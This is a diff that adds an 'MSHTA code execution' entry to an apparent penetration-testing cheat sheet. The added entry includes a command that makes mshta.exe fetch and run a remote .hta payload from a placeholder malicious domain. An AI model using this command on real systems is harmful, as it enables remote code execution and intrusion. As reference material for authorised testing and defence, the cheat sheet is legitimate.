@@ -658,6 +658,17 @@ python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support
 ## [](#header-2)Exploit
 
 
+#### Code Execution with MSHTA
+
+```powershell
+
+mshta.exe is a default binary shipped on all versions of Windows which allows the execution of .hta payloads
+
+mshta.exe https://malicious.domain/runme.hta
+
+
+```
+
 
 #### [](#header-4) LLMNR / NBT-NS Spoofing
 
